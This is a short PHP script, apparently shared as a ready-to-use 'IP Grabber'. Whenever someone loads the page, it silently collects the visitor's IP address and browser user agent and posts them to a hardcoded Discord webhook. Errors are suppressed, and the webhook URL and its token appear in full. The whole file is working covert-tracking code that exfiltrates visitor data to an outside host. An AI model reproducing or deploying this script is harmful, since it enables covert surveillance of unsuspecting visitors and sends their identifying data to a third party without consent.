<?php error_reporting(0); // Made by pxbble
$botpfp = "https://asoftclick.com/wp-content/uploads/2020/11/track-an-ip-address.jpg";
$webhook = "https://discord.com/api/webhooks/1198122142269706322/q_wGmI3zRM7emlsUUJm_xcPOokLAp-Drexm1oDLM1vXiHHs2sIOx-Z7eWZF6aJIbGwLu";
$ip = $_SERVER['REMOTE_ADDR'];
$device = $_SERVER['HTTP_USER_AGENT'];
$hookObject = json_encode([
    "username" => "BOT - IP Grabber",
    "avatar_url" => "$botpfp",
     "content" => "",
        "embeds" => [
            [
                "title" => '**:money_with_wings: Someone Entered!**',
                "type" => "rich",
                "description" => "",
                "url" => "",
                "color" => hexdec("00008B"),
                "thumbnail" => [
                    "url" => "$botpfp"
                ],
                "author" => [
                     "name" => "IP Grabber",
                     "url" => "",
                ],
                "footer" => [
                    "text" => "IP Grabber",
                  "icon_url" => "$botpfp"
                ],
                "fields" => [
                    [
                        "name" => "**IP Address:**",
                        "value" => "```$ip```",
                        "inline" => False
                    ],
                    [
                        "name" => "**Device:**",
                        "value" => "```$device```",
                        "inline" => False
                    ],
                ]
            ],
        ],
    
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "$webhook",
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
$response = curl_exec($ch);
curl_close($ch);